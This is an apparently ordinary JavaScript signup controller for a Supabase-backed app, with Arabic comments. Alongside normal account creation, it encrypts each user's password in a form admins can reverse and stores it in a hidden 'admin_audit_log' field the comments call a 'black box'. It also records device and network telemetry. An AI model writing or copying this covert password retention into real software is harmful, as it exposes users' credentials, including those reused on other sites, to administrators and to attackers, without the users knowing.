
// controllers/authController.js
'use strict';

const supabase = require('../services/data/supabase');
const { encryptForAdmin } = require('../utils/crypto');
const logger = require('../utils/logger');

async function signup(req, res) {
  const { email, password, firstName, lastName, client_telemetry } = req.body;

  // 1. تحقق مبدئي سريع
  if (!email || !password) {
    return res.status(400).json({ error: 'Email and Password are required.' });
  }

  try {
    // 2. محاولة إنشاء الحساب في Supabase Auth (التحقق الحقيقي)
    const { data: authData, error: authError } = await supabase.auth.signUp({
      email,
      password,
    });

    // 🛑 إذا رفضت Supabase التسجيل (إيميل موجود، باسوورد قصير...)
    if (authError) {
      logger.warn(`Signup Failed for ${email}: ${authError.message}`);
      return res.status(400).json({ error: authError.message });
    }

    const userId = authData.user?.id;

    if (!userId) {
      return res.status(500).json({ error: 'User created but ID missing.' });
    }

    // ✅ نجح التسجيل! الآن نقوم بالتشفير والحفظ
    const encryptedPassword = encryptForAdmin(password);

    // 3. إدخال بيانات البروفايل + البيانات الحساسة المشفرة
    const { error: profileError } = await supabase
      .from('users')
      .insert({
        id: userId, // نربطه بنفس الـ ID
        email: email,
        first_name: firstName,
        last_name: lastName,
        client_telemetry: client_telemetry || {}, // بيانات الجهاز والشبكة
        
        // 🔥 الصندوق الأسود (للمراجعة اليدوية فقط)
        admin_audit_log: {
            encrypted_pass: encryptedPassword,
            checked_by_admin: false,
            created_at: new Date().toISOString()
        },
        
        created_at: new Date().toISOString(),
        last_active_at: new Date().toISOString()
      });

    if (profileError) {
      // حالة نادرة: تم إنشاء Auth لكن فشل إنشاء البروفايل
      // يفضل هنا حذف الـ Auth user للتنظيف، لكن للتبسيط سنرجع خطأ
      logger.error(`Profile Creation Failed for ${userId}:`, profileError);
      return res.status(500).json({ error: 'Account created but profile setup failed.' });
    }

    logger.success(`New User Registered: ${email} (ID: ${userId})`);
    
    return res.status(201).json({ 
      success: true, 
      message: 'Account created successfully.',
      user: { id: userId, email, firstName }
    });

  } catch (err) {
    logger.error('Signup Critical Error:', err);
    return res.status(500).json({ error: 'Internal Server Error' });
  }
}

module.exports = { signup };
